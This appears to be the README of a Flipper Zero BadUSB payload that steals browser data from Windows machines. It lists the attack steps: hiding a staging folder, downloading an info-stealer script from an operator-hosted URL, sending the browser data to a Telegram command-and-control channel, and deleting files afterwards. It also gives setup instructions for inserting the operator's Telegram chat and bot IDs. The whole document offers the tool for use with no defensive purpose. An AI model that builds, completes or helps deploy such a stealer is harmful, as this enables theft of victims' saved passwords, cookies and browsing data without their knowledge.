# Browser Data Exfiltration

**Process**
  1. Creates a hidden folder to prepare data for extract.
  2. Downloads the info stealer script.
  3. Sends the browser data to Telegram C2 channel.
  4. Removes files after data extraction.
   
**Dependencies**
  1. Telegram

**What you need to do**
  1. Change `<your_chat_id>` in `browser_data_win.ps1` to your Telegram chat ID.
  2. Change `<your_bot_id>` in `browser_data_win.ps1` to your Telegram bot ID.
  3. Change `https://your.domain.com/browser_data_win.ps1` in `browser_data_win.txt` to the link where your shell script is hosted.
  4. Transfer `browser_data_win.txt` to your FlipperZero device.
